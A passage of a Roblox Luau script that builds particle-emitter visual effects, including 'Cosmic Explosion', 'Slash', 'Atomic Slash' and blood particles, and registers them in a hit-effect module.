    local Glow = Instance.new("ParticleEmitter")
    Glow.Name = "Glow"
    Glow.Lifetime = NumberRange.new(0.16, 0.16)
    Glow.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1421725, 0.6182796), NumberSequenceKeypoint.new(1, 1)})
    Glow.Color = ColorSequence.new(Color3.fromRGB(91, 177, 252))
    Glow.Speed = NumberRange.new(0, 0)
    Glow.Brightness = 5
    Glow.Size = NumberSequence.new(9.1873131, 16.5032349)
    Glow.Enabled = false
    Glow.ZOffset = -0.0565939
    Glow.Rate = 50
    Glow.Texture = "rbxassetid://8708637750"
    local Gradient1 = Instance.new("ParticleEmitter")
    Gradient1.Name = "Gradient1"
    Gradient1.Lifetime = NumberRange.new(0.3, 0.3)
    Gradient1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.15, 0.3), NumberSequenceKeypoint.new(1, 1)})
    Gradient1.Color = ColorSequence.new(Color3.fromRGB(115, 201, 255))
    Gradient1.Speed = NumberRange.new(0, 0)
    Gradient1.Brightness = 6
    Gradient1.Size = NumberSequence.new(0, 11.6261358)
    Gradient1.Enabled = false
    Gradient1.ZOffset = 0.9187313
    Gradient1.Rate = 50
    Gradient1.Texture = "rbxassetid://8196169974"
    Gradient1.Parent = Attachment
    local Shards = Instance.new("ParticleEmitter")
    Shards.Name = "Shards"
    Shards.Lifetime = NumberRange.new(0.19, 0.7)
    Shards.SpreadAngle = Vector2.new(-90, 90)
    Shards.Color = ColorSequence.new(Color3.fromRGB(108, 184, 255))
    Shards.Drag = 10
    Shards.VelocitySpread = -90
    Shards.Squash = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.5705521, 0.4125001), NumberSequenceKeypoint.new(1, -0.9375)})
    Shards.Speed = NumberRange.new(97.7530136, 146.9970093)
    Shards.Brightness = 4
    Shards.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.284774, 1.2389833, 0.1534118), NumberSequenceKeypoint.new(1, 0)})
    Shards.Enabled = false
    Shards.Acceleration = Vector3.new(0, -56.961341857910156, 0)
    Shards.ZOffset = 0.5705321
    Shards.Rate = 50
    Shards.Texture = "rbxassetid://8030734851"
    Shards.Rotation = NumberRange.new(90, 90)
    Shards.Orientation = Enum.ParticleOrientation.VelocityParallel
    Shards.Parent = Attachment
    local ShardsDark = Instance.new("ParticleEmitter")
    ShardsDark.Name = "ShardsDark"
    ShardsDark.Lifetime = NumberRange.new(0.19, 0.35)
    ShardsDark.SpreadAngle = Vector2.new(-90, 90)
    ShardsDark.Color = ColorSequence.new(Color3.fromRGB(108, 184, 255))
    ShardsDark.Drag = 10
    ShardsDark.VelocitySpread = -90
    ShardsDark.Squash = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.5705521, 0.4125001), NumberSequenceKeypoint.new(1, -0.9375)})
    ShardsDark.Speed = NumberRange.new(97.7530136, 146.9970093)
    ShardsDark.Brightness = 4
    ShardsDark.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.290774, 0.6734411, 0.1534118), NumberSequenceKeypoint.new(1, 0)})
    ShardsDark.Enabled = false
    ShardsDark.ZOffset = 0.5705321
    ShardsDark.Rate = 50
    ShardsDark.Texture = "rbxassetid://8030734851"
    ShardsDark.Rotation = NumberRange.new(90, 90)
    ShardsDark.Orientation = Enum.ParticleOrientation.VelocityParallel
    ShardsDark.Parent = Attachment
    local Specs = Instance.new("ParticleEmitter")
    Specs.Name = "Specs"
    Specs.Lifetime = NumberRange.new(0.33, 1.4)
    Specs.SpreadAngle = Vector2.new(360, -1000)
    Specs.Color = ColorSequence.new(Color3.fromRGB(98, 174, 255))
    Specs.Drag = 10
    Specs.VelocitySpread = 360
    Specs.Speed = NumberRange.new(36.7492523, 146.9970093)
    Specs.Brightness = 7
    Specs.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.200774, 2.0311937, 0.4363973), NumberSequenceKeypoint.new(1, 0)})
    Specs.Enabled = false
    Specs.Acceleration = Vector3.new(0, 36.74925231933594, 0)
    Specs.Rate = 50
    Specs.Texture = "rbxassetid://8030760338"
    Specs.EmissionDirection = Enum.NormalId.Right
    Specs.Parent = Attachment
    local Specs1 = Instance.new("ParticleEmitter")
    Specs1.Name = "Specs"
    Specs1.Lifetime = NumberRange.new(0.33, 1.75)
    Specs1.SpreadAngle = Vector2.new(90, -90)
    Specs1.Color = ColorSequence.new(Color3.fromRGB(106, 171, 255))
    Specs1.Drag = 9
    Specs1.VelocitySpread = 90
    Specs1.Speed = NumberRange.new(42.2616425, 73.4985046)
    Specs1.Brightness = 6
    Specs1.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.210774, 0.3978962, 0.1855686), NumberSequenceKeypoint.new(1, 0)})
    Specs1.Enabled = false
    Specs1.Acceleration = Vector3.new(0, -20.21208953857422, 0)
    Specs1.ZOffset = 0.5144895
    Specs1.Rate = 50
    Specs1.Texture = "rbxassetid://8030760338"
    Specs1.Parent = Attachment
    local Specs2 = Instance.new("ParticleEmitter")
    Specs2.Name = "Specs"
    Specs2.Lifetime = NumberRange.new(0.19, 1.2)
    Specs2.SpreadAngle = Vector2.new(360, -1000)
    Specs2.Color = ColorSequence.new(Color3.fromRGB(98, 174, 255))
    Specs2.Drag = 10
    Specs2.VelocitySpread = 360
    Specs2.Speed = NumberRange.new(36.7492523, 146.9970093)
    Specs2.Brightness = 7
    Specs2.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.200774, 2.0311937, 0.4363973), NumberSequenceKeypoint.new(1, 0)})
    Specs2.Enabled = false
    Specs2.Acceleration = Vector3.new(0, 36.74925231933594, 0)
    Specs2.Rate = 50
    Specs2.Texture = "rbxassetid://8030760338"
    Specs2.EmissionDirection = Enum.NormalId.Right
    Specs2.Parent = Attachment
    local Specs21 = Instance.new("ParticleEmitter")
    Specs21.Name = "Specs2"
    Specs21.Lifetime = NumberRange.new(0.19, 1.35)
    Specs21.SpreadAngle = Vector2.new(90, -90)
    Specs21.Color = ColorSequence.new(Color3.fromRGB(106, 171, 255))
    Specs21.Drag = 12
    Specs21.VelocitySpread = 90
    Specs21.Speed = NumberRange.new(42.2616425, 73.4985046)
    Specs21.Brightness = 6
    Specs21.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.216774, 0.5721694, 0.1855686), NumberSequenceKeypoint.new(1, 0)})
    Specs21.Enabled = false
    Specs21.Acceleration = Vector3.new(0, -20.21208953857422, 0)
    Specs21.ZOffset = 0.5144895
    Specs21.Rate = 50
    Specs21.Texture = "rbxassetid://8030760338"
    Specs21.Parent = Attachment
    local ddddddddddddddddddd = Instance.new("ParticleEmitter")
    ddddddddddddddddddd.Name = "ddddddddddddddddddd"
    ddddddddddddddddddd.Lifetime = NumberRange.new(0.19, 0.37)
    ddddddddddddddddddd.SpreadAngle = Vector2.new(90, -90)
    ddddddddddddddddddd.LockedToPart = true
    ddddddddddddddddddd.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.6429392, 0), NumberSequenceKeypoint.new(1, 0)})
    ddddddddddddddddddd.LightEmission = 1
    ddddddddddddddddddd.Color = ColorSequence.new(Color3.fromRGB(90, 184, 255), Color3.fromRGB(165, 251, 255))
    ddddddddddddddddddd.Drag = 6
    ddddddddddddddddddd.TimeScale = 0.7
    ddddddddddddddddddd.VelocitySpread = 90
    ddddddddddddddddddd.Speed = NumberRange.new(81.5833435, 110.2477646)
    ddddddddddddddddddd.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.410774, 0.6711507, 0.3356177), NumberSequenceKeypoint.new(1, 0)})
    ddddddddddddddddddd.Enabled = false
    ddddddddddddddddddd.Acceleration = Vector3.new(0, -81.58334350585938, 0)
    ddddddddddddddddddd.ZOffset = 0.8345273
    ddddddddddddddddddd.Rate = 50
    ddddddddddddddddddd.Texture = "rbxassetid://1053546634"
    ddddddddddddddddddd.RotSpeed = NumberRange.new(-444, 166)
    ddddddddddddddddddd.Rotation = NumberRange.new(-360, 360)
    ddddddddddddddddddd.Parent = Attachment
    local large_shard = Instance.new("ParticleEmitter")
    large_shard.Name = "large_shard"
    large_shard.Lifetime = NumberRange.new(0.19, 0.28)
    large_shard.SpreadAngle = Vector2.new(-90, 90)
    large_shard.Color = ColorSequence.new(Color3.fromRGB(108, 184, 255))
    large_shard.Drag = 10
    large_shard.VelocitySpread = -90
    large_shard.Squash = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.5705521, 0.4125001), NumberSequenceKeypoint.new(1, -0.9375)})
    large_shard.Speed = NumberRange.new(97.7530136, 146.9970093)
    large_shard.Brightness = 4
    large_shard.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.260774, 3.515605, 0.1534118), NumberSequenceKeypoint.new(1, 0)})
    large_shard.Enabled = false
    large_shard.ZOffset = 0.5705321
    large_shard.Rate = 50
    large_shard.Texture = "rbxassetid://8030734851"
    large_shard.Rotation = NumberRange.new(90, 90)
    large_shard.Orientation = Enum.ParticleOrientation.VelocityParallel
    large_shard.Parent = Attachment
    local out_Specs = Instance.new("ParticleEmitter")
    out_Specs.Name = "out_Specs"
    out_Specs.Lifetime = NumberRange.new(0.19, 1)
    out_Specs.SpreadAngle = Vector2.new(44, -1000)
    out_Specs.Color = ColorSequence.new(Color3.fromRGB(98, 174, 255))
    out_Specs.Drag = 10
    out_Specs.VelocitySpread = 44
    out_Specs.Speed = NumberRange.new(36.7492523, 146.9970093)
    out_Specs.Brightness = 7
    out_Specs.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.244774, 0.5469525, 0.1433053), NumberSequenceKeypoint.new(1, 0)})
    out_Specs.Enabled = false
    out_Specs.Acceleration = Vector3.new(0, -3.215559720993042, 0)
    out_Specs.Rate = 50
    out_Specs.Texture = "rbxassetid://8030760338"
    out_Specs.EmissionDirection = Enum.NormalId.Right
    out_Specs.Parent = Attachment
    local Effect = Instance.new("ParticleEmitter")
    Effect.Name = "Effect"
    Effect.Lifetime = NumberRange.new(0.4, 0.7)
    Effect.FlipbookLayout = Enum.ParticleFlipbookLayout.Grid4x4
    Effect.SpreadAngle = Vector2.new(360, -360)
    Effect.LockedToPart = true
    Effect.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1070999, 0.19375), NumberSequenceKeypoint.new(0.7761194, 0.88125), NumberSequenceKeypoint.new(1, 1)})
    Effect.LightEmission = 1
    Effect.Color = ColorSequence.new(Color3.fromRGB(92, 161, 252))
    Effect.Drag = 1
    Effect.VelocitySpread = 360
    Effect.Speed = NumberRange.new(0.0036749, 0.0036749)
    Effect.Brightness = 2.0999999
    Effect.Size = NumberSequence.new(6.9680691, 9.9213123)
    Effect.Enabled = false
    Effect.ZOffset = 0.4777403
    Effect.Rate = 50
    Effect.Texture = "rbxassetid://9484012464"
    Effect.RotSpeed = NumberRange.new(-150, -150)
    Effect.FlipbookMode = Enum.ParticleFlipbookMode.OneShot
    Effect.Rotation = NumberRange.new(50, 50)
    Effect.Orientation = Enum.ParticleOrientation.VelocityPerpendicular
    Effect.Parent = Attachment
    local Crescents = Instance.new("ParticleEmitter")
    Crescents.Name = "Crescents"
    Crescents.Lifetime = NumberRange.new(0.19, 0.38)
    Crescents.SpreadAngle = Vector2.new(-360, 360)
    Crescents.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1932907, 0), NumberSequenceKeypoint.new(0.778754, 0), NumberSequenceKeypoint.new(1, 1)})
    Crescents.LightEmission = 1
    Crescents.Color = ColorSequence.new(Color3.fromRGB(92, 161, 252))
    Crescents.VelocitySpread = -360
    Crescents.Speed = NumberRange.new(0.0826858, 0.0826858)
    Crescents.Brightness = 20
    Crescents.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.398774, 8.8026266, 2.2834616), NumberSequenceKeypoint.new(1, 11.477972, 1.860431)})
    Crescents.Enabled = false
    Crescents.ZOffset = 0.4542207
    Crescents.Rate = 50
    Crescents.Texture = "rbxassetid://12509373457"
    Crescents.RotSpeed = NumberRange.new(800, 1000)
    Crescents.Rotation = NumberRange.new(-360, 360)
    Crescents.Orientation = Enum.ParticleOrientation.VelocityPerpendicular
    Crescents.Parent = Attachment
    Insane.Parent = workspace
end
do --// Cosmic Explosion
    local Part = Instance.new("Part")
    Part.Parent = ReplicatedStorage
    local Attachment = Instance.new("Attachment")
    Attachment.Name = "Attachment"
    Attachment.Parent = Part
    HitEffectModule.Locals.Type["Cosmic Explosion"] = Attachment
    local Glow = Instance.new("ParticleEmitter")
    Glow.Name = "Glow"
    Glow.Lifetime = NumberRange.new(0.16, 0.16)
    Glow.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1421725, 0.6182796), NumberSequenceKeypoint.new(1, 1)})
    Glow.Color = ColorSequence.new(Color3.fromRGB(173, 82, 252))
    Glow.Speed = NumberRange.new(0, 0)
    Glow.Brightness = 5
    Glow.Size = NumberSequence.new(9.1873131, 16.5032349)
    Glow.Enabled = false
    Glow.ZOffset = -0.0565939
    Glow.Rate = 50
    Glow.Texture = "rbxassetid://8708637750"
    Glow.Parent = Attachment
    local Effect = Instance.new("ParticleEmitter")
    Effect.Name = "Effect"
    Effect.Lifetime = NumberRange.new(0.4, 0.7)
    Effect.FlipbookLayout = Enum.ParticleFlipbookLayout.Grid4x4
    Effect.SpreadAngle = Vector2.new(360, -360)
    Effect.LockedToPart = true
    Effect.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1070999, 0.19375), NumberSequenceKeypoint.new(0.7761194, 0.88125), NumberSequenceKeypoint.new(1, 1)})
    Effect.LightEmission = 1
    Effect.Color = ColorSequence.new(Color3.fromRGB(173, 82, 252))
    Effect.Drag = 1
    Effect.VelocitySpread = 360
    Effect.Speed = NumberRange.new(0.0036749, 0.0036749)
    Effect.Brightness = 2.0999999
    Effect.Size = NumberSequence.new(6.9680691, 9.9213123)
    Effect.Enabled = false
    Effect.ZOffset = 0.4777403
    Effect.Rate = 50
    Effect.Texture = "rbxassetid://9484012464"
    Effect.RotSpeed = NumberRange.new(-150, -150)
    Effect.FlipbookMode = Enum.ParticleFlipbookMode.OneShot
    Effect.Rotation = NumberRange.new(50, 50)
    Effect.Orientation = Enum.ParticleOrientation.VelocityPerpendicular
    Effect.Parent = Attachment
    local Gradient1 = Instance.new("ParticleEmitter")
    Gradient1.Name = "Gradient1"
    Gradient1.Lifetime = NumberRange.new(0.3, 0.3)
    Gradient1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.15, 0.3), NumberSequenceKeypoint.new(1, 1)})
    Gradient1.Color = ColorSequence.new(Color3.fromRGB(173, 82, 252))
    Gradient1.Speed = NumberRange.new(0, 0)
    Gradient1.Brightness = 6
    Gradient1.Size = NumberSequence.new(0, 11.6261358)
    Gradient1.Enabled = false
    Gradient1.ZOffset = 0.9187313
    Gradient1.Rate = 50
    Gradient1.Texture = "rbxassetid://8196169974"
    Gradient1.Parent = Attachment
    local Shards = Instance.new("ParticleEmitter")
    Shards.Name = "Shards"
    Shards.Lifetime = NumberRange.new(0.19, 0.7)
    Shards.SpreadAngle = Vector2.new(-90, 90)
    Shards.Color = ColorSequence.new(Color3.fromRGB(173, 82, 252))
    Shards.Drag = 10
    Shards.VelocitySpread = -90
    Shards.Squash = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.5705521, 0.4125001), NumberSequenceKeypoint.new(1, -0.9375)})
    Shards.Speed = NumberRange.new(97.7530136, 146.9970093)
    Shards.Brightness = 4
    Shards.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.284774, 1.2389833, 0.1534118), NumberSequenceKeypoint.new(1, 0)})
    Shards.Enabled = false
    Shards.Acceleration = Vector3.new(0, -56.961341857910156, 0)
    Shards.ZOffset = 0.5705321
    Shards.Rate = 50
    Shards.Texture = "rbxassetid://8030734851"
    Shards.Rotation = NumberRange.new(90, 90)
    Shards.Orientation = Enum.ParticleOrientation.VelocityParallel
    Shards.Parent = Attachment
    local Crescents = Instance.new("ParticleEmitter")
    Crescents.Name = "Crescents"
    Crescents.Lifetime = NumberRange.new(0.19, 0.38)
    Crescents.SpreadAngle = Vector2.new(-360, 360)
    Crescents.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1932907, 0), NumberSequenceKeypoint.new(0.778754, 0), NumberSequenceKeypoint.new(1, 1)})
    Crescents.LightEmission = 10
    Crescents.Color = ColorSequence.new(Color3.fromRGB(160, 96, 255))
    Crescents.VelocitySpread = -360
    Crescents.Speed = NumberRange.new(0.0826858, 0.0826858)
    Crescents.Brightness = 4
    Crescents.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.398774, 8.8026266, 2.2834616), NumberSequenceKeypoint.new(1, 11.477972, 1.860431)})
    Crescents.Enabled = false
    Crescents.ZOffset = 0.4542207
    Crescents.Rate = 50
    Crescents.Texture = "rbxassetid://12509373457"
    Crescents.RotSpeed = NumberRange.new(800, 1000)
    Crescents.Rotation = NumberRange.new(-360, 360)
    Crescents.Orientation = Enum.ParticleOrientation.VelocityPerpendicular
    Crescents.Parent = Attachment
    local ParticleEmitter2 = Instance.new("ParticleEmitter")
    ParticleEmitter2.Name = "ParticleEmitter2"
    ParticleEmitter2.FlipbookFramerate = NumberRange.new(20, 20)
    ParticleEmitter2.Lifetime = NumberRange.new(0.19, 0.38)
    ParticleEmitter2.FlipbookLayout = Enum.ParticleFlipbookLayout.Grid4x4
    ParticleEmitter2.SpreadAngle = Vector2.new(360, 360)
    ParticleEmitter2.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.209842, 0.5), NumberSequenceKeypoint.new(0.503842, 0.263333), NumberSequenceKeypoint.new(0.799842, 0.5), NumberSequenceKeypoint.new(1, 1)})
    ParticleEmitter2.LightEmission = 1
    ParticleEmitter2.Color = ColorSequence.new(Color3.fromRGB(173, 82, 252))
    ParticleEmitter2.VelocitySpread = 360
    ParticleEmitter2.Speed = NumberRange.new(0.0161231, 0.0161231)
    ParticleEmitter2.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 4.3125), NumberSequenceKeypoint.new(0.3985056, 7.9375), NumberSequenceKeypoint.new(1, 10)})
    ParticleEmitter2.Enabled = false
    ParticleEmitter2.ZOffset = 0.15
    ParticleEmitter2.Rate = 100
    ParticleEmitter2.Texture = "http://www.roblox.com/asset/?id=12394566430"
    ParticleEmitter2.FlipbookMode = Enum.ParticleFlipbookMode.OneShot
    ParticleEmitter2.Rotation = NumberRange.new(39, 999)
    ParticleEmitter2.Orientation = Enum.ParticleOrientation.VelocityParallel
    ParticleEmitter2.Parent = Attachment
    Part.Parent = workspace
end
do --// Slash
    local Part = Instance.new("Part")
    Part.Parent = ReplicatedStorage
    local Attachment = Instance.new("Attachment")
    Attachment.Parent = Part
    HitEffectModule.Locals.Type["Slash"] = Attachment
    local Crescents = Instance.new("ParticleEmitter")
    Crescents.Name = "Crescents"
    Crescents.Lifetime = NumberRange.new(0.19, 0.38)
    Crescents.SpreadAngle = Vector2.new(-360, 360)
    Crescents.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1932907, 0), NumberSequenceKeypoint.new(0.778754, 0), NumberSequenceKeypoint.new(1, 1)})
    Crescents.LightEmission = 10
    Crescents.Color = ColorSequence.new(Color3.fromRGB(160, 96, 255))
    Crescents.VelocitySpread = -360
    Crescents.Speed = NumberRange.new(0.0826858, 0.0826858)
    Crescents.Brightness = 4
    Crescents.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.398774, 8.8026266, 2.2834616), NumberSequenceKeypoint.new(1, 11.477972, 1.860431)})
    Crescents.Enabled = false
    Crescents.ZOffset = 0.4542207
    Crescents.Rate = 50
    Crescents.Texture = "rbxassetid://12509373457"
    Crescents.RotSpeed = NumberRange.new(800, 1000)
    Crescents.Rotation = NumberRange.new(-360, 360)
    Crescents.Orientation = Enum.ParticleOrientation.VelocityPerpendicular
    Crescents.Parent = Attachment
    Part.Parent = workspace
end
do --// Atomic Slash
    local Part = Instance.new("Part")
    Part.Parent = ReplicatedStorage
    local Attachment = Instance.new("Attachment")
    Attachment.Parent = Part
    HitEffectModule.Locals.Type["Atomic Slash"] = Attachment
    local Crescents = Instance.new("ParticleEmitter")
    Crescents.Name = "Crescents"
    Crescents.Lifetime = NumberRange.new(0.19, 0.38)
    Crescents.SpreadAngle = Vector2.new(-360, 360)
    Crescents.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1932907, 0), NumberSequenceKeypoint.new(0.778754, 0), NumberSequenceKeypoint.new(1, 1)})
    Crescents.LightEmission = 10
    Crescents.Color = ColorSequence.new(Color3.fromRGB(160, 96, 255))
    Crescents.VelocitySpread = -360
    Crescents.Speed = NumberRange.new(0.0826858, 0.0826858)
    Crescents.Brightness = 4
    Crescents.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.398774, 8.8026266, 2.2834616), NumberSequenceKeypoint.new(1, 11.477972, 1.860431)})
    Crescents.Enabled = false
    Crescents.ZOffset = 0.4542207
    Crescents.Rate = 50
    Crescents.Texture = "rbxassetid://12509373457"
    Crescents.RotSpeed = NumberRange.new(800, 1000)
    Crescents.Rotation = NumberRange.new(-360, 360)
    Crescents.Orientation = Enum.ParticleOrientation.VelocityPerpendicular
    Crescents.Parent = Attachment
    local Glow = Instance.new("ParticleEmitter")
    Glow.Name = "Glow"
    Glow.Lifetime = NumberRange.new(0.16, 0.16)
    Glow.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1421725, 0.6182796), NumberSequenceKeypoint.new(1, 1)})
    Glow.Color = ColorSequence.new(Color3.fromRGB(173, 82, 252))
    Glow.Speed = NumberRange.new(0, 0)
    Glow.Brightness = 5
    Glow.Size = NumberSequence.new(9.1873131, 16.5032349)
    Glow.Enabled = false
    Glow.ZOffset = -0.0565939
    Glow.Rate = 50
    Glow.Texture = "rbxassetid://8708637750"
    Glow.Parent = Attachment
    local Effect = Instance.new("ParticleEmitter")
    Effect.Name = "Effect"
    Effect.Lifetime = NumberRange.new(0.4, 0.7)
    Effect.FlipbookLayout = Enum.ParticleFlipbookLayout.Grid4x4
    Effect.SpreadAngle = Vector2.new(360, -360)
    Effect.LockedToPart = true
    Effect.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1070999, 0.19375), NumberSequenceKeypoint.new(0.7761194, 0.88125), NumberSequenceKeypoint.new(1, 1)})
    Effect.LightEmission = 1
    Effect.Color = ColorSequence.new(Color3.fromRGB(173, 82, 252))
    Effect.Drag = 1
    Effect.VelocitySpread = 360
    Effect.Speed = NumberRange.new(0.0036749, 0.0036749)
    Effect.Brightness = 2.0999999
    Effect.Size = NumberSequence.new(6.9680691, 9.9213123)
    Effect.Enabled = false
    Effect.ZOffset = 0.4777403
    Effect.Rate = 50
    Effect.Texture = "rbxassetid://9484012464"
    Effect.RotSpeed = NumberRange.new(-150, -150)
    Effect.FlipbookMode = Enum.ParticleFlipbookMode.OneShot
    Effect.Rotation = NumberRange.new(50, 50)
    Effect.Orientation = Enum.ParticleOrientation.VelocityPerpendicular
    Effect.Parent = Attachment
    local Gradient1 = Instance.new("ParticleEmitter")
    Gradient1.Name = "Gradient1"
    Gradient1.Lifetime = NumberRange.new(0.3, 0.3)
    Gradient1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.15, 0.3), NumberSequenceKeypoint.new(1, 1)})
    Gradient1.Color = ColorSequence.new(Color3.fromRGB(173, 82, 252))
    Gradient1.Speed = NumberRange.new(0, 0)
    Gradient1.Brightness = 6
    Gradient1.Size = NumberSequence.new(0, 11.6261358)
    Gradient1.Enabled = false
    Gradient1.ZOffset = 0.9187313
    Gradient1.Rate = 50
    Gradient1.Texture = "rbxassetid://8196169974"
    Gradient1.Parent = Attachment
    local Shards = Instance.new("ParticleEmitter")
    Shards.Name = "Shards"
    Shards.Lifetime = NumberRange.new(0.19, 0.7)
    Shards.SpreadAngle = Vector2.new(-90, 90)
    Shards.Color = ColorSequence.new(Color3.fromRGB(179, 145, 253))
    Shards.Drag = 10
    Shards.VelocitySpread = -90
    Shards.Squash = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.5705521, 0.4125001), NumberSequenceKeypoint.new(1, -0.9375)})
    Shards.Speed = NumberRange.new(97.7530136, 146.9970093)
    Shards.Brightness = 4
    Shards.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.284774, 1.2389833, 0.1534118), NumberSequenceKeypoint.new(1, 0)})
    Shards.Enabled = false
    Shards.Acceleration = Vector3.new(0, -56.961341857910156, 0)
    Shards.ZOffset = 0.5705321
    Shards.Rate = 50
    Shards.Texture = "rbxassetid://8030734851"
    Shards.Rotation = NumberRange.new(90, 90)
    Shards.Orientation = Enum.ParticleOrientation.VelocityParallel
    Shards.Parent = Attachment
    Part.Parent = workspace
end
do --// Lightning
	local bloodAttachment = Instance.new('Attachment')
	local blood02 = Instance.new('ParticleEmitter')

	blood02.Name = 'Blood-02'
	blood02.Lifetime = NumberRange.new(0.5, 0.75)
	blood02.SpreadAngle = Vector2.new(90, 90)
	blood02.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.125, 0.5),
		NumberSequenceKeypoint.new(1, 1),
	})
	blood02.Color = ColorSequence.new(Color3.fromRGB(130, 0, 0))
	blood02.VelocitySpread = 90
	blood02.Speed = NumberRange.new(5, 10)
	blood02.Size = NumberSequence.new(0.5, 2)
	blood02.Acceleration = Vector3.new(0, -20, 0)
	blood02.RotSpeed = NumberRange.new(-90, 90)
	blood02.Rate = 250
	blood02.Texture = 'rbxassetid://241576804'
	blood02.Rotation = NumberRange.new(-360, 360)
	blood02.Enabled = false
	blood02.Parent = bloodAttachment

	local blood01 = Instance.new('ParticleEmitter')

	blood01.Name = 'Blood-01'
	blood01.Lifetime = NumberRange.new(0.5, 0.5)
	blood01.FlipbookLayout = Enum.ParticleFlipbookLayout.Grid4x4
	blood01.SpreadAngle = Vector2.new(10, 10)
	blood01.LockedToPart = true
	blood01.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.105985, 0),
		NumberSequenceKeypoint.new(0.5024938, 0),
		NumberSequenceKeypoint.new(1, 1),
	})
	blood01.Color = ColorSequence.new(Color3.fromRGB(130, 0, 0))
	blood01.VelocitySpread = 10
	blood01.Speed = NumberRange.new(0.01, 0.01)
	blood01.ZOffset = 0.5
	blood01.Size = NumberSequence.new(2.1875, 3.5625)
	blood01.Rate = 10
	blood01.Texture = 'rbxassetid://16668936898'
	blood01.EmissionDirection = Enum.NormalId.Front
	blood01.FlipbookMode = Enum.ParticleFlipbookMode.OneShot
	blood01.Rotation = NumberRange.new(-360, 360)
	blood01.Enabled = false
	blood01.Parent = bloodAttachment

	local blood03 = Instance.new('ParticleEmitter')

	blood03.Name = 'Blood-03'
	blood03.LightInfluence = 1
	blood03.Lifetime = NumberRange.new(0.25, 0.5)
	blood03.SpreadAngle = Vector2.new(360, 360)
	blood03.LockedToPart = true
	blood03.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.25, 0),
		NumberSequenceKeypoint.new(1, 1),
	})
	blood03.Color = ColorSequence.new(Color3.fromRGB(100, 0, 0))
	blood03.VelocitySpread = 360
	blood03.Squash = NumberSequence.new(0, -3)
	blood03.Speed = NumberRange.new(15, 25)
	blood03.Size = NumberSequence.new(0.125, 0.6874996)
	blood03.Acceleration = Vector3.new(0, -75, 0)
	blood03.Rate = 100
	blood03.Texture = 'rbxassetid://4509687978'
	blood03.Orientation = Enum.ParticleOrientation.VelocityParallel
	blood03.Enabled = false
	blood03.Parent = bloodAttachment

	local blood05 = Instance.new('ParticleEmitter')

	blood05.Name = 'Blood-05'
	blood05.Lifetime = NumberRange.new(0.75, 0.75)
	blood05.FlipbookLayout = Enum.ParticleFlipbookLayout.Grid4x4
	blood05.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.5037407, 0),
		NumberSequenceKeypoint.new(1, 1),
	})
	blood05.Color = ColorSequence.new(Color3.fromRGB(130, 0, 0))
	blood05.Speed = NumberRange.new(0.001, 0.001)
	blood05.ZOffset = 4
	blood05.Size = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0.25),
		NumberSequenceKeypoint.new(0.3764706, 2.0625, 0.5763994),
		NumberSequenceKeypoint.new(1, 2.6875, 0.125),
	})
	blood05.Rate = 5
